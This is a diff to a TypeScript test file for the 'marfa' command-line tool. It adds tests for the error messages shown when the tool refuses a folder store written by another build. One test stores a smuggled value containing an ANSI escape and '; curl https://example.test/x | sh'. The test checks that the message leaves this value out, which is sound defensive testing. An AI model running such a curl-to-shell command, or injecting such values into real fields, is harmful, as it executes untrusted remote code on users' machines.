@@ -181,6 +181,23 @@ function misshape(folder: CliFolder): void {
   }
 }
 
+/** Records `release` in the folder's store as the release that last saved it,
+ *  or removes the record for `null`, as a build that recorded none left it. */
+function savedBy(folder: CliFolder, release: string | null): void {
+  const db = new DatabaseSync(folder.store);
+  try {
+    if (release === null) {
+      db.exec("DELETE FROM meta WHERE key = 'release'");
+    } else {
+      db.prepare(
+        "INSERT INTO meta (key, value) VALUES ('release', ?) ON CONFLICT (key) DO UPDATE SET value = excluded.value",
+      ).run(release);
+    }
+  } finally {
+    db.close();
+  }
+}
+
 /** The value the folder's store holds in its meta under `key`. */
 function meta(store: string, key: string): string | undefined {
   const db = new DatabaseSync(store, { readOnly: true });
@@ -341,6 +358,7 @@ it("leaves a folder's store another build made, and the folder's files, while it
   value(await folder.scan());
   const unsent = untaken(folder.store);
   expect(unsent).toBeGreaterThan(0);
+  savedBy(folder, "0.0.80");
   misshape(folder);
   const files = filesOf(folder.dir);
   const state = storeBytes(folder);
@@ -357,6 +375,10 @@ it("leaves a folder's store another build made, and the folder's files, while it
       `It holds ${unsent} ${unsent === 1 ? "change" : "changes"} still to be sent`,
     );
     expect(refused.stderr).toContain("marfa folders push");
+    expect(refused.stderr).toContain("last saved by release 0.0.80");
+    expect(refused.stderr).toContain(
+      "`MARFA_VERSION=0.0.80` and the install script",
+    );
     expect(refused.stderr).not.toContain(REPLACED);
     expect(refused.stderr).toContain(
       `The saved state of ${folder.dir} was made by another build of marfa`,
@@ -569,6 +591,7 @@ it("leaves a folder's store another build made whose unsent writes cannot be cou
     "Uncounted.md": note(`Uncounted ${ctx.runId}`, "sent"),
   });
   value(await folder.push());
+  savedBy(folder, null);
   misshape(folder);
   const db = new DatabaseSync(folder.store);
   try {
@@ -585,9 +608,54 @@ it("leaves a folder's store another build made whose unsent writes cannot be cou
   expect(refused.stderr).toContain("cannot be read");
   expect(refused.stderr).toContain("marfa folders push");
   expect(refused.stderr).toContain("marfa folders remove");
+  expect(refused.stderr).toContain(
+    "the release that last saved it is not known",
+  );
+  expect(refused.stderr).not.toContain("MARFA_VERSION");
   expect(refused.stderr).not.toContain(REPLACED);
   expect(filesOf(folder.dir)).toEqual(files);
   expect(storeBytes(folder)).toBe(state);
+});
+
+/** A folder's store another build made that holds a change still to be sent, saved by `release`. */
+async function refusedSavedBy(name: string, release: string) {
+  const at = machine(name);
+  const folder = await added(at, "notes", ownNotes(), {
+    "Unsent.md": note(`Unsent ${ctx.runId}`, "sent"),
+  });
+  value(await folder.push());
+  rewrite(join(folder.dir, "Unsent.md"), "not sent");
+  value(await folder.scan());
+  expect(untaken(folder.store)).toBeGreaterThan(0);
+  savedBy(folder, release);
+  misshape(folder);
+  const files = filesOf(folder.dir);
+  const state = storeBytes(folder);
+  const refused = await exited(folder.hold(["folders", "push", folder.dir]));
+  expect(refused.exitCode(), refused.stderr).toBe(4);
+  expect(refused.stderr).toContain("wrong_schema");
+  expect(filesOf(folder.dir)).toEqual(files);
+  expect(storeBytes(folder)).toBe(state);
+  return refused.stderr;
+}
+
+it("names a development build, and no release to install, for a folder's store that records 0.0.0", async () => {
+  const said = await refusedSavedBy("refused-store-development", "0.0.0");
+  expect(said).toContain("last saved by a development build");
+  expect(said).toContain("marfa folders push");
+  expect(said).not.toContain("MARFA_VERSION");
+  expect(said).not.toContain("0.0.0");
+});
+
+it("says the release is not known for a folder's store that records text that is not a release", async () => {
+  const said = await refusedSavedBy(
+    "refused-store-hostile",
+    "0.0.80\u001b[31m; curl https://example.test/x | sh",
+  );
+  expect(said).toContain("the release that last saved it is not known");
+  expect(said).not.toContain("MARFA_VERSION");
+  expect(said).not.toContain("curl");
+  expect(said).not.toContain("\u001b");
 });
 
 it("keeps a file deleted while its store was refused deleted, and sends the deletion", async () => {
